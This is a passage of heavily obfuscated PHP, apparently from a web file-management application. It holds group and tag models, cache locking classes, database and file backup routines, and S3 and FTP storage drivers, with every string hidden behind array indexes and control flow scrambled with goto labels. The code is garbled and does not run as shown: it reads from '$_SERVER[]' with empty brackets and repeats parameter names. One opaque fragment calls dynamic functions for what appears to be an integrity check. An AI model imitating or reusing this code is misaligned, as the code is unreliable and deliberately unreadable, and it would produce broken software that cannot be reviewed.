$cЯ亄++) { if ($E == $cЯ亄) { continue; } if ($this->isParentOf($a┭е[$cЯ亄], $a┭е[$E])) { $cҮ = !0; break; } } if (!$cҮ) { $C[] = $a┭е[$E]; } } return $C; } protected function isParentOf($e, $fȍ) { goto BΈ饱; BΈ饱: $dĚ =& $_SERVER[]; if (!$e || !$fȍ || $e == $fȍ) { return !1; } $E⪑ = $this->getInfoSimple($e); goto C; C: $Bӵ = $this->getInfoSimple($fȍ); $C = $E⪑[$dĚ[502]] . $e . $dĚ[47]; if (substr($Bӵ[$dĚ[502]], 0, strlen($C)) == $C) { return !0; } goto f稽; f稽: return !1; goto fŦѹֆ; fŦѹֆ: } public function groupShowRoot($dޮò, $aَ = false) { goto A譒왴; D: $d = $this->parentLevelArray($Eٗ[$Fݤ[502]]); $bܚ = array($dޮò); if (count($d) == 0) { return $bܚ; } goto EҚ; EҚ: if ($aَ && count($d) == 1) { return $bܚ; } if (!$Eٗ[$Fݤ[445]] || !isset($Eٗ[$Fݤ[445]][$Fݤ[1778]]) || $Eٗ[$Fݤ[445]][$Fݤ[1778]] == $Fݤ[1752]) { return $this->groupShowRoot($d[count($d) - 1], $aَ); } if ($Eٗ[$Fݤ[445]][$Fݤ[1778]] == $Fݤ[355]) { $c = explode($Fݤ[47], $Eٗ[$Fݤ[445]][$Fݤ[1779]]); if ($c) { $bܚ = array_merge($bܚ, $c); } } goto F߅; F߅: return $bܚ; goto Dӛ; A譒왴: $Fݤ =& $_SERVER[]; $Eٗ = $this->getInfo($dޮò); if (!$Eٗ) { return array(); } goto D; Dӛ: } protected function resetParentLevel() { $eܗ =& $_SERVER[]; $f = $eܗ[1702]; $CԵ = $this->select(); $CԵ = array_to_keyvalue($CԵ, $f); foreach ($CԵ as $BÎގ) { goto D; aꟃ߰: $this->where(array($f => $BÎގ[$f]))->save(array($eܗ[566] => $B)); goto EԔ; D: $E = $BÎގ; $B = array(); while ($E[$eܗ[478]] != 0) { $B[] = $E[$eܗ[478]]; $E = $CԵ[$E[$eܗ[478]]]; } goto bҦړ; bҦړ: $B[] = 0; $B = $eܗ[47] . implode($eܗ[47], array_reverse($B)) . $eܗ[47]; $this->setNamePinyin($BÎގ[$f], $BÎގ[$eܗ[28]]); goto aꟃ߰; EԔ: } return $CԵ; } public function groupNameAuto($A, $A) { $c =& $_SERVER[]; $D䂦 = $this->where(array($c[394] => $A))->getField($c[28], !0); if (!$D䂦 || !in_array($A, $D䂦)) { return $A; } for ($eФ = 1; $eФ <= count($D䂦) + 1; $eФ++) { $eդ = $A . "\x28{$eФ}\51"; if (!in_array($eդ, $D䂦)) { return $eդ; } } } public function groupSwitch($Cཆ, $A) { goto Cڗ; D: $f܆ = array($bҜȊ[404] => 2, $bҜȊ[478] => 0, $bҜȊ[403] => 1, $bҜȊ[484] => array($bҜȊ[7], array($Cཆ, $A))); $D׻ = Model($bҜȊ[795])->where($f܆)->field($bҜȊ[1798])->select(); $D׻ = array_to_keyvalue($D׻, $bҜȊ[484], $bҜȊ[395]); goto cʻ; cʻ: $d燌 = !empty($D׻[$Cཆ]) ? $D׻[$Cཆ] : !1; if ($d燌) { goto b΄؏; b΄؏: if (!$D׻[$A]) { $D׻[$A] = Model($bҜȊ[795])->groupRootAdd($A); } $Bш = $D׻[$A]; $f܆ = array($bҜȊ[478] => $d燌); goto eϐ; eϐ: $D׻ = Model($bҜȊ[795])->where($f܆)->field($bҜȊ[1799])->select(); if (!$D׻) { $D׻ = array(); } Model($bҜȊ[795])->moveClearAuth = !1; goto D͔; D͔: foreach ($D׻ as $aٿƱ) { $dҞ = $aٿƱ[$bҜȊ[403]] == $bҜȊ[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($bҜȊ[795])->move($aٿƱ[$bҜȊ[395]], $Bш, $dҞ); } Model($bҜȊ[795])->moveClearAuth = !0; $f܆ = array($bҜȊ[404] => 2, $bҜȊ[484] => $Cཆ); goto dܮ; dܮ: $f = array($bҜȊ[484] => $A); Model($bҜȊ[1800])->where($f܆)->save($f); Model($bҜȊ[1801])->where($f܆)->save($f); goto Cˑ; Cˑ: } $this->_changeChildLevel($Fᴪ[$Cཆ], $Fᴪ[$A], !0); goto bԉ; A썇: $Fᴪ = array_to_keyvalue($Fᴪ, $bҜȊ[1702]); if (!isset($Fᴪ[$Cཆ]) || !isset($Fᴪ[$A]) || $Fᴪ[$Cཆ][$bҜȊ[478]] == 0) { return !1; } $f܆ = array($bҜȊ[1702] => $Cཆ); goto c氶; Cڗ: $bҜȊ =& $_SERVER[]; $f܆ = array($bҜȊ[1702] => array($bҜȊ[7], array($Cཆ, $A))); $Fᴪ = $this->where($f܆)->select(); goto A썇; c氶: $e = Model($bҜȊ[1783])->where($f܆)->select(); if (!$e) { $e = array(); } foreach ($e as $c) { $Bǆܗ = $c[$bҜȊ[1533]]; $f܆ = array($bҜȊ[1533] => $Bǆܗ, $bҜȊ[1702] => $A); $FК = Model($bҜȊ[1783])->where($f܆)->find(); if (!$FК) { $Bʌ = array($A => $c[$bҜȊ[1797]]); Model($bҜȊ[519])->userGroupAdd($Bǆܗ, $Bʌ); } Model($bҜȊ[519])->userGroupRemove($Bǆܗ, $Cཆ); } goto D; bԉ: $this->where(array($bҜȊ[478] => $Cཆ))->save(array($bҜȊ[478] => $A)); return !0; goto d抉; d抉: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($CÄ) { $Cձ =& $_SERVER[]; return array($Cձ[1802] => array($CÄ[0], $Cձ[1803]), $Cձ[1804] => array($CÄ[0], $Cձ[1805])); } protected function get($Eڈ诈) { $aʈ =& $_SERVER[]; $cėՅ = Model($aʈ[503])->metaGet($Eڈ诈, $aʈ[1806]); $C = json_decode($cėՅ, !0); return $C ? $C : array($aʈ[1807] => $aʈ[87], $aʈ[367] => array()); } protected function set($Aæ, $Cң) { $d򆎦 =& $_SERVER[]; $Cң = $Cң ? $Cң : array($d򆎦[1807] => $d򆎦[87], $d򆎦[367] => array()); Model($d򆎦[503])->metaSet($Aæ, $d򆎦[1806], json_encode($Cң)); return Model($d򆎦[503])->metaSet($Aæ, $d򆎦[1806], json_encode($Cң)); } protected function getByTagID($E, $e) { goto eȟ; Aǫތ: return is_array($fĆ) ? $fĆ : !1; goto Dԙ; F쥝: $Dͷ = $this->get($E); if (!$Dͷ || !isset($Dͷ[$FԜ[367]])) { return !1; } $fĆ = array_find_by_field($Dͷ[$FԜ[367]], $FԜ[393], $e); goto Aǫތ; eȟ: $FԜ =& $_SERVER[]; if (!$E || !$e) { return !1; } if (!Model($FԜ[503])->getInfoSimple($E)) { return !1; } goto F쥝; Dԙ: } public function listSource($b⾅, $F֫ŋ) { goto B𽿩; C: foreach ($Dߦ as $DӬŠ) { if (!in_array($DӬŠ, $dߓ)) { $Aؼ[] = $DӬŠ; } } if ($Aؼ) { $this->removeBySource($b⾅, $Aؼ); } return $D; goto dȾ; dϧى: $D = Model($aꥐ[1209])->listSource($e); if (!$D || count($Dߦ) == $D[$aꥐ[364]][$aꥐ[365]]) { return $D; } $Aؼ = array(); goto Ḑ; Aߥ: $B = array(); foreach ($c↛ as $bԧ܏) { $DӬŠ = $bԧ܏[$aꥐ[76]]; if (!$DӬŠ) { continue; } if (!isset($B[$DӬŠ])) { $B[$DӬŠ] = array(); } $B[$DӬŠ][] = $bԧ܏[$aꥐ[419]]; } $Dߦ = array(); goto aҰ; B𽿩: $aꥐ =& $_SERVER[]; if ($F֫ŋ && !is_array($F֫ŋ)) { $F֫ŋ = array($F֫ŋ); } $c↛ = $this->listData($b⾅); goto Aߥ; aҰ: foreach ($B as $Dժ => $Aֶ) { $F팎 = !0; if (!$F֫ŋ) { $Dߦ[] = $Dժ; continue; } foreach ($F֫ŋ as $cՋÇ) { if (!in_array($cՋÇ, $Aֶ)) { $F팎 = !1; break; } } if ($F팎) { $Dߦ[] = $Dժ; } } if (!$Dߦ) { return array(); } $e = array($aꥐ[410] => array($aꥐ[411], $Dߦ), $aꥐ[484] => $b⾅, $aꥐ[404] => SourceModel::TYPE_GROUP); goto dϧى; Ḑ: $Aڦ = array_to_keyvalue($D[$aꥐ[75]], $aꥐ[33], $aꥐ[395]); $f䓔 = array_to_keyvalue($D[$aꥐ[74]], $aꥐ[33], $aꥐ[395]); $dߓ = array_merge($f䓔, $Aڦ); goto C; dȾ: } protected function listData($eۭڏ) { $e扵 =& $_SERVER[]; $DȘ = array($e扵[1524] => 0, $e扵[463] => array($e扵[1808], 0), $e扵[415] => $e扵[1809] . $eۭڏ); $Bݮ = $e扵[1810]; $B몪 = $this->field($Bݮ)->where($DȘ)->order($e扵[1811])->select(); return $B몪 ? $B몪 : array(); } protected function addToTag($bƐ, $b݇, $b权ԇ) { $FㄒÇ =& $_SERVER[]; if (!$this->getByTagID($bƐ, $b权ԇ) || !$b݇) { return !1; } if (!Model($FㄒÇ[795])->pathInfo($b݇)) { return !1; } $fسȸ = array($FㄒÇ[1524] => 0, $FㄒÇ[463] => $b权ԇ, $FㄒÇ[414] => $b݇, $FㄒÇ[415] => $FㄒÇ[1812] . $bƐ, $FㄒÇ[413] => $FㄒÇ[33], $FㄒÇ[1706] => 0); if ($this->where($fسȸ)->find()) { return !1; } return $this->add($fسȸ); } protected function removeFromTag($Eõ, $F, $e٧) { $dՕ֡ =& $_SERVER[]; if (!$this->getByTagID($Eõ, $e٧) || !$F) { return !1; } if (is_array($F)) { $F = array($dՕ֡[7], $F); } $E垫ڢ = array($dՕ֡[1524] => 0, $dՕ֡[463] => $e٧, $dՕ֡[415] => $dՕ֡[1812] . $Eõ, $dՕ֡[414] => $F); return $this->where($E垫ڢ)->delete(); } protected function removeByTag($F, $Aڻ) { $eɇ =& $_SERVER[]; if (!$this->getByTagID($F, $Aڻ)) { return !1; } $e = array($eɇ[1524] => 0, $eɇ[463] => $Aڻ, $eɇ[415] => $eɇ[1812] . $F); return $this->where($e)->delete(); } protected function removeBySource($Fٍާ, $ċ) { $a𼄻 =& $_SERVER[]; if (!$Fٍާ || !$ċ) { return !1; } if (is_array($ċ)) { $ċ = array($a𼄻[7], $ċ); } $e׋ = array($a𼄻[1524] => 0, $a𼄻[414] => $ċ, $a𼄻[463] => array($a𼄻[973], 0), $a𼄻[415] => $a𼄻[1812] . $Fٍާ); return $this->where($e׋)->delete(); } } goto AՃ; e͒: $b꼢 = $_SERVER[$_SERVER[][1081]]; $f = $_SERVER[][1400]; if ($_SERVER[$_SERVER[][836]] != $f($b꼢)) { goto a轗; EͰҽ: $F͂($b꼢); goto C; a: $E醼 = explode($_SERVER[][229], $E״л); if (count($E醼) < $_SERVER[][595]) { $cαϹҪ = $_SERVER[][842]; $cαϹҪ(); } $F͂ = $_SERVER[][1080]; goto EͰҽ; a轗: $E = $_SERVER[][839]; $DҊ = $_SERVER[$_SERVER[][840]] . $_SERVER[][841]; $E״л = $E($DҊ); goto a; C: } goto c㗔; a: class CacheLockMemcached { public function lock($Eڲ, $Dթќ = 0) { $dț = Cache::init(); $Fǔѯ = microtime(!0) + $Dթќ; while (microtime(!0) < $Fǔѯ) { $cפ = $dț->get($Eڲ); if (!$cפ || $cפ < microtime(!0)) { $E߬ = $dț->handle->add($Eڲ, $Fǔѯ, $Dթќ); if ($E߬) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F駅Ƌ) { return Cache::init()->get($F駅Ƌ); } public function unlock($Dߢ) { return Cache::init()->remove($Dߢ); } } class CacheLockDatabase { public function lock($cȊ, $c = 0) { $b̍̍ = Model($_SERVER[][799]); $B = microtime(!0) + $c; while (microtime(!0) < $B) { $B = $b̍̍->get($cȊ); if (!$B || $B < microtime(!0)) { $f̵Љȟ = $b̍̍->set($cȊ, $B); if ($f̵Љȟ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($F) { return Model($_SERVER[][799])->get($F); } public function unlock($Fƙ) { Model($_SERVER[][799])->remove($Fƙ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($D܇ᖲ, $dũ) { $fś =& $_SERVER[]; if (!class_exists($fś[826])) { show_json($fś[827], !1); } $this->cacheTime = $dũ; $this->handle = new Memcached(); if (is_array($D܇ᖲ[$fś[828]]) && count($D܇ᖲ[$fś[828]]) >= 1) { foreach ($D܇ᖲ[$fś[828]] as $cυ) { $B۫ = explode($fś[4], $cυ); $this->handle->addServer($B۫[0], $B۫[1]); } } else { $this->handle->addServer($D܇ᖲ[$fś[175]], $D܇ᖲ[$fś[176]]); } } public function set($c셊Ҳ, $DԦӑ, $C菬ت = false) { $C菬ت = $C菬ت ? $C菬ت : $this->cacheTime; return $this->handle->set($c셊Ҳ, $DԦӑ, $C菬ت); } public function get($fײǅ) { return $this->handle->get($fײǅ); } public function remove($Eڨ) { return $this->handle->delete($Eڨ); } public function deleteAll() { return $this->handle->flush(); } } goto dҢ; a: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $aǕ =& $_SERVER[]; $C͚ے = $GLOBALS[$aǕ[6]][$aǕ[347]]; self::$cachePath = $C͚ے[$aǕ[193]][$aǕ[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bݩ, $aœ£ = 0) { goto dċ; Dɘ: $E = rtrim(self::$cachePath, $f[8]) . $f[823] . md5($bݩ) . $f[820]; if (file_exists($E) && filemtime($E) && filemtime($E) < time() - 10) { @unlink($E); } do { if (file_exists($E)) { cacheLockWait(); continue; } $C = fopen($E, $f[824]); if (!$C) { return !1; } $Eı = flock($C, LOCK_EX | LOCK_NB); self::$caches[$bݩ] = array($f[825] => $C, $f[193] => $E); fwrite($C, $f̺ލ); clearstatcache(); if ($C && $Eı) { return !0; } cacheLockWait(); } while (microtime(!0) < $f̺ލ); goto a; a: $this->unlock($bݩ); return !1; goto e; dċ: $f =& $_SERVER[]; $Dؑ = microtime(!0); $f̺ލ = $Dؑ + $aœ£ + 0.0001; goto Dɘ; e: } public function lockGet($a򭨄) { $DѴ =& $_SERVER[]; $Eλ = rtrim(self::$cachePath, $DѴ[8]) . $DѴ[823] . md5($a򭨄) . $DѴ[820]; return file_exists($Eλ); } public function unlock($fͅ) { goto Eͮ; Bꍿ: unset(self::$caches[$fͅ]); goto dЌΌ; C: @flock($f탷[$d̓[825]], LOCK_UN); @fclose($f탷[$d̓[825]]); @unlink($f탷[$d̓[193]]); goto Bꍿ; Eͮ: $d̓ =& $_SERVER[]; $f탷 = self::$caches[$fͅ]; if (!$f탷) { return; } goto C; dЌΌ: } } class CacheLockRedis { public function lock($bɆ, $aŸɍ = 10) { $Dݺ = Cache::init(); $dѡ = microtime(!0) + $aŸɍ; while (microtime(!0) < $dѡ) { $eէ = $Dݺ->get($bɆ); if (!$eէ) { $dՇą = $Dݺ->setLock($bɆ, $dѡ, $aŸɍ); if ($dՇą) { return !0; } } else { if ($eէ < microtime(!0)) { $Dݺ->set($bɆ, $dѡ, $aŸɍ * 2); if ($Dݺ->get($bɆ) === $eէ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($eɏ) { return Cache::init()->get($eɏ); } public function unlock($E 萊) { return Cache::init()->remove($E 萊); } } goto a; C: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto fשǥ; aě: $Fǭϟ = $this->tmpFilesPath() . $bѭ[743] . self::$name . $bѭ[8]; del_dir($Fǭϟ); mk_dir($Fǭϟ); goto dƪԏ; E𦾏: self::$name = $B͗[$bѭ[28]]; $cʩ = $GLOBALS[$bѭ[6]][$bѭ[17]]; $A̺ = $this->_dbType($cʩ); goto FͶ; eﶳ: Backup::set($B獄); if ($bɢ㗱 > $Eٓ) { write_log(array($bѭ[758], $B獄), $bѭ[747]); return !1; } return !0; goto c; fשǥ: $bѭ =& $_SERVER[]; $B͗ = Backup::get(); self::$io = $B͗[$bѭ[717]]; goto E𦾏; E𺑐: if (isset($aۈ->task[$bѭ[753]])) { $BȰ = $aۈ->task[$bѭ[753]] ? $aۈ->task[$bѭ[753]] : timeFloat(); $b∾ = $BȰ - $aۈ->task[$bѭ[754]]; if ($b∾ >= 0.2) { $bɢ㗱 += 1; } } $aۈ->end(); $B獄 = array($bѭ[741] => $A̺, $bѭ[738] => 1, $bѭ[755] => $bɢ㗱, $bѭ[756] => $Eٓ, $bѭ[757] => time()); goto eﶳ; FͶ: $Dԏ = new DbManage($cʩ, $A̺); $B獄 = array($bѭ[741] => $A̺, $bѭ[742] => time()); Backup::set($B獄); goto aě; dƪԏ: $bɢ㗱 = $Eٓ = 0; try { $a涑 = $Dԏ->db()->getTables(); } catch (Exception $c) { return !1; } $a涑 = array_diff($a涑, array($bѭ[744], $bѭ[745])); goto cԈ˩; cԈ˩: foreach ($a涑 as $C) { $bɢ㗱 += $Dԏ->model($C)->count(); } $aۈ = new Task($bѭ[746], $bѭ[747], $bɢ㗱, LNG($bѭ[748]) . $bѭ[749] . LNG($bѭ[750])); foreach ($a涑 as $C) { $C = $Fǭϟ . $C . $bѭ[751]; $d홰 = null; if ($C == $bѭ[752] && (!isset($B͗[$bѭ[720]]) || $B͗[$bѭ[720]] == $bѭ[191])) { $d홰 = self::$io; } $Eٓ += $Dԏ->sqlFromDb($C, $C, $aۈ, $d홰); } goto E𺑐; c: } private function _dbType($a텱) { goto cߵڐ; cߵڐ: $F⤥ =& $_SERVER[]; $a텱 = array_change_key_case($a텱); $Eο = $a텱[$F⤥[759]]; goto aĔ; C؋: return $Eο; goto DԪ; aĔ: if ($Eο == $F⤥[760]) { $e硭Δ = explode($F⤥[4], $a텱[$F⤥[761]]); $Eο = $e硭Δ[0]; } $eі = array($F⤥[762] => $F⤥[9], $F⤥[763] => $F⤥[764]); if (isset($eі[$Eο])) { $Eο = $eі[$Eο]; } goto C؋; DԪ: } private function tmpFilesPath() { $Fɘꛛ =& $_SERVER[]; $A = TEMP_FILES; if ($GLOBALS[$Fɘꛛ[6]][$Fɘꛛ[88]][$Fɘꛛ[765]]) { $A = $GLOBALS[$Fɘꛛ[6]][$Fɘꛛ[88]][$Fɘꛛ[765]]; if (!mk_dir($A) || !is_writable($A) || !IO::mkfile($A . $Fɘꛛ[766])) { $A = TEMP_FILES; } } return $A; } } class BackupDbFile { public function __construct() { } public function index() { goto A; cӉ: Backup::set($E틸); return !0; goto E畈; E憔: $f庋 = $this->tmpFilesPath() . "\142\x61\143\153\x75\x70\x5f{$D}\57"; $F = $this->backupPath($B); if (!($F = IO::mkdir($F))) { return !1; } goto b¼; A膇: if (!$f) { return !1; } $E틸 = array($dې[767] => $f, $dې[768] => time()); Backup::set($E틸); goto Fֲ; Cʮ: IO::copy($c䉆, $F); $fɸ->end(); $E틸 = array($dې[775] => $f, $dې[776] => time()); goto cӉ; b¼: $Cᆾ = IO::listPath($f庋); $Cܬ = isset($Cᆾ[$dې[74]]) ? $Cᆾ[$dې[74]] : array(); $f = array_sum(array_column($Cܬ, $dې[78])); goto A膇; Cۃ: $Fء = CONTROLLER_DIR . $dې[773]; $c䉆 = CONTROLLER_DIR . $dې[774]; IO::copy($Fء, $F); goto Cʮ; A: $dې =& $_SERVER[]; $B = Backup::get(); $D = $B[$dې[28]]; goto E憔; Fֲ: $fɸ = new TaskFileTransfer($dې[769], $dې[747], count($Cܬ), LNG($dې[748]) . $dې[440] . LNG($dې[750]) . $dې[770]); $fɸ->task[$dې[728]] = $f; foreach ($Cᆾ[$dې[74]] as $e) { $d丽 = IO::move($e[$dې[76]], $F); if (!$d丽) { $fɸ->end(); $B⒙ڧ = IO::getLastError($dې[771] . $e[$dې[76]] . $dې[772] . $F . $dې[517]); write_log($B⒙ڧ, $dې[747]); return !1; } } goto Cۃ; E畈: } private function backupPath($C褄Ẫ) { $e뙘 =& $_SERVER[]; $dү = $C褄Ẫ[$e뙘[28]]; $e = Model($e뙘[735])->get($e뙘[736]); $eɏ = substr(md5($e뙘[737] . $e . $dү), 0, 8); return "\173\x69\x6f\72{$C褄Ẫ[$e뙘[717]]}\x7d\x2f\x64\141\164\x61\142\x61\163\x65\57\142\141\143\153\165\x70\57" . $dү . $e뙘[71] . $eɏ; } private function tmpFilesPath() { $a =& $_SERVER[]; $B蚭 = TEMP_FILES; if ($GLOBALS[$a[6]][$a[88]][$a[765]]) { $B蚭 = $GLOBALS[$a[6]][$a[88]][$a[765]]; if (!mk_dir($B蚭) || !is_writable($B蚭) || !IO::mkfile($B蚭 . $a[766])) { $B蚭 = TEMP_FILES; } } return $B蚭; } } class BackupFile { public function __construct() { } public function index() { goto A̲ڄ; A̲ڄ: $aƢ = Backup::get(); $fۇ = $aƢ[$_SERVER[][291]][$_SERVER[][193]][$_SERVER[][447]]; $Eʮ⚱ = array($_SERVER[][448] => array($_SERVER[][777], $fۇ), $_SERVER[][778] => array($_SERVER[][329], $aƢ[$_SERVER[][717]])); goto F֧; F֧: $eģ = (int) Model($_SERVER[][752])->where($Eʮ⚱)->count($_SERVER[][447]); $bș = (int) Model($_SERVER[][752])->where($Eʮ⚱)->sum($_SERVER[][78]); $a = new TaskFileTransfer($_SERVER[][779], $_SERVER[][747], $eģ, LNG($_SERVER[][748]) . $_SERVER[][749] . LNG($_SERVER[][780])); goto b߆; cȷ: $this->_fileFilter($f); return !0; goto bϱ; c: $Eþ = !0; $dɍ = $this->storeIds(); $bۅ٬ = 1; goto Dԃއ; b߆: $a->task[$_SERVER[][728]] = $bș; $bԦˈ = array($_SERVER[][781] => $eģ, $_SERVER[][782] => $bș, $_SERVER[][783] => time()); Backup::set($bԦˈ); goto c; c鯇: $bԦˈ = array($_SERVER[][793] => 1, $_SERVER[][476] => time(), $_SERVER[][740] => 1, $_SERVER[][790] => $fۇ, $_SERVER[][782] => $bș, $_SERVER[][781] => $eģ, $_SERVER[][794] => time()); if ($F) { $bԦˈ[$_SERVER[][791]] = $A; $bԦˈ[$_SERVER[][792]] = $f; } Backup::set($bԦˈ); goto cȷ; Dԃއ: $F = 1000; $Fجȿ = $F = 0; $f = array(); goto c킟; c킟: $f = $A = 0; do { $eǈ = $_SERVER[][784]; $bٸ = Model($_SERVER[][752])->where($Eʮ⚱)->field($eǈ)->order($_SERVER[][785])->selectPage($F, $bۅ٬); $e = !empty($bٸ[$_SERVER[][367]]) ? $bٸ[$_SERVER[][367]] : array(); foreach ($e as $f҇) { goto Cբ; d럑: if (IO::exist($dӍ)) { $a->updateFileEnd($f҇[$_SERVER[][28]], $f҇[$_SERVER[][78]]); } else { $dӍ = get_path_father($dӍ); IO::mkdir($dӍ); if (!IO::copy($aŲ, $dӍ, $_SERVER[][788])) { write_log($_SERVER[][789] . $aŲ . $_SERVER[][772] . $dӍ . $_SERVER[][517], $_SERVER[][747]); $Eþ = !1; break; } } $fۇ = $f҇[$_SERVER[][447]]; $F += 1; goto F퐭; F퐭: $Fجȿ += $f҇[$_SERVER[][78]]; $A += 1; $f += $f҇[$_SERVER[][78]]; goto bƗӯ; bƗӯ: if ($Fجȿ >= 1024 * 1024 * 100) { $bԦˈ = array($_SERVER[][790] => $fۇ, $_SERVER[][791] => $A, $_SERVER[][792] => $f); Backup::set($bԦˈ); $Fجȿ = $F = 0; } goto Bόφ; Cբ: if (!$this->_fileExist($f҇, $f, $dɍ)) { $eģ -= 1; $bș -= (int) $f҇[$_SERVER[][78]]; write_log("\146\x69\x6c\145\40\x6e\157\x74\40\x65\170\x69\163\164\56\146\151\154\x65\111\104\72{$f҇[$_SERVER[][447]]}\x2c\40\x70\x61\164\150\x3a{$f҇[$_SERVER[][76]]}", $_SERVER[][786]); continue; } $aŲ = $f҇[$_SERVER[][76]]; $dӍ = "\173\151\157\x3a{$aƢ[$_SERVER[][717]]}\175" . substr($aŲ, strlen("\173\x69\x6f\x3a{$f҇[$_SERVER[][787]]}\175")); goto d럑; Bόφ: } $eԉϿ = count($e); $bۅ٬++; } while ($eԉϿ == $F); $a->end(); goto c鯇; bϱ: } private function _fileExist($B, &$B, $fܚ) { goto fτ; eҪР: $B = array_merge($B, array_to_keyvalue($C鱒ѓ, $b[33], $b[447])); return !1; goto E܏; fτ: $b =& $_SERVER[]; $b = $B[$b[76]]; if (in_array($B[$b[447]], $B)) { return !1; } goto Fֆ; Fֆ: if (!in_array($B[$b[787]], $fܚ)) { return !1; } if (IO::exist($b)) { return !0; } $e鲥 = get_path_father($b); goto b̍ո; b̍ո: if (IO::exist($e鲥)) { $B[] = $B[$b[447]]; return !1; } $a = array($b[787] => $B[$b[787]], $b[76] => array($b[380], "{$e鲥}\45")); $C鱒ѓ = Model($b[752])->where($a)->field($b[448])->select(); goto eҪР; E܏: } private function _fileFilter($dل) { $C =& $_SERVER[]; if (empty($dل)) { return; } $cͥ = array($C[447] => array($C[7], array_unique($dل))); $C = Model($C[795])->where($cͥ)->field($C[395])->select(); foreach ($C as $a) { Model($C[795])->remove($a[$C[395]], !1); } } private function storeIds() { $b䏖 =& $_SERVER[]; $a솃 = Model($b䏖[732])->listData(); $bڌ = array(); $dߜ = $GLOBALS[$b䏖[6]][$b䏖[88]][$b䏖[796]]; foreach ($a솃 as $CЈ) { $eɓ = strtolower($CЈ[$b䏖[94]]); if (!isset($dߜ[$eɓ])) { continue; } $a = $b䏖[72] . (isset($dߜ[$eɓ]) ? $dߜ[$eɓ] : ucfirst($eɓ)); if (!class_exists($a)) { continue; } $bڌ[] = $CЈ[$b䏖[393]]; } return $bڌ; } } goto BۆɄ; Ã: class PathDriverEDS extends PathDriverMinIO { public function __construct($a۱샑) { parent::__construct($a۱샑); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($EМ­) { parent::__construct($EМ­); $this->signatureVersion($_SERVER[][212]); } public function uploadFormData($Cǿ, $fٝ = 3600) { goto A; Bӓ: $C = array($this->accessKey, $a뱈, $this->region, $Fƍ鈞, $Dԃ); $f⭌ = implode($f㾑[8], $C); $CХσ = array($f㾑[1194] => gmdate($f㾑[1193], strtotime($f㾑[1230])), $f㾑[1195] => array(array($f㾑[1197] => $this->bucket), array($f㾑[1196] => $F쫹), array($f㾑[1198], $f㾑[1199], $f㾑[33]), array($f㾑[1198], $f㾑[1231], $f㾑[33]), array($f㾑[1198], $f㾑[1232], $f㾑[33]), array($f㾑[1200] => $eͧ), array($f㾑[1233] => $f⭌), array($f㾑[1234] => $Dק), array($f㾑[1235] => $Eݣ), array($f㾑[1236] => $bʺ۔))); goto A갽; A갽: $bʽ = base64_encode(json_encode($CХσ)); $cح = hash_hmac($f㾑[1237], $a뱈, $f㾑[1238] . $this->secret, !0); $E絜 = hash_hmac($f㾑[1237], $this->region, $cح, !0); goto f; A: $f㾑 =& $_SERVER[]; $F쫹 = $f㾑[192]; $Dק = $f㾑[1227]; goto D֖; f: $C󢘗 = hash_hmac($f㾑[1237], $Fƍ鈞, $E絜, !0); $b = hash_hmac($f㾑[1237], $Dԃ, $C󢘗, !0); $aċ = hash_hmac($f㾑[1237], $bʽ, $b); goto eВȵ; eВȵ: $dኛ = array($f㾑[211] => $f㾑[33], $f㾑[1239] => $f㾑[33], $f㾑[1196] => $F쫹, $f㾑[1200] => $eͧ, $f㾑[1204] => $bʽ, $f㾑[1240] => $f⭌, $f㾑[1241] => $Dק, $f㾑[1242] => $Eݣ, $f㾑[1243] => $bʺ۔, $f㾑[1244] => $aċ, $f㾑[175] => $this->getHost()); return $dኛ; goto A׭; a: $Dԃ = $f㾑[1229]; $bʺ۔ = $fٝ . $f㾑[33]; $eͧ = $f㾑[1192]; goto Bӓ; D֖: $Fƍ鈞 = $f㾑[59]; $Eݣ = gmdate($f㾑[1228]); $a뱈 = gmdate($f㾑[716]); goto a; A׭: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($Fч) { parent::__construct(); if (count($Fч) > 0) { $this->_init($Fч); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($e) { $B͈ǭ =& $_SERVER[]; global $config; $this->appCharset = $config[$B͈ǭ[1245]]; $this->systemCharset = $config[$B͈ǭ[1246]]; if (isset($e[$B͈ǭ[1247]]) && $e[$B͈ǭ[1247]]) { $this->systemCharset = $e[$B͈ǭ[1247]]; } } public function iconvApp($B҅) { return $this->iconvTo($B҅, $this->systemCharset, $this->appCharset); } public function iconvSystem($a) { return $this->iconvTo($a, $this->appCharset, $this->systemCharset); } public function getPathOuter($cƾ) { goto E߃Ї؍; E߃Ї؍: $dꍭ =& $_SERVER[]; $eݒ = $this->iconvApp($this->pathBase); $cƾ = $this->iconvApp($cƾ); goto A; DӐ: $cƾ = KodIO::clear($cƾ); $cƾ = substr($cƾ, strlen($eݒ)); if (empty($this->pathDriver)) { return $cƾ; } goto b; A: if (substr($eݒ, 0, 2) == $dꍭ[1248]) { $eݒ = BASIC_PATH . substr($eݒ, 2); } if (substr($cƾ, 0, 2) == $dꍭ[1248]) { $cƾ = BASIC_PATH . substr($cƾ, 2); } $eݒ = KodIO::clear($eݒ); goto DӐ; b: return $this->pathDriver . $dꍭ[8] . ltrim($cƾ, $dꍭ[8]); goto f׹; f׹: } private function _init($F = array()) { $d҈ =& $_SERVER[]; if (!function_exists($d҈[1249])) { throw new Exception(LNG($d҈[1250])); } $this->config = $F; $this->charsetReset($F); foreach ($F as $A諴Ť => $Dփ) { if (isset($this->{$A諴Ť})) { $this->{$A諴Ť} = $Dփ; } } return $this->_login($F); } private function _login($D͑) { goto F囮; A˗: $Eʕ[$Cض] = array($B[1254] => $this->connect, $B[175] => $this->host, $B[174] => $this->scheme, $B[176] => $this->port); return $E; goto aÞ; E摕: if (isset($Eʕ[$Cض])) { foreach ($Eʕ[$Cض] as $bḂ => $fᆞ) { 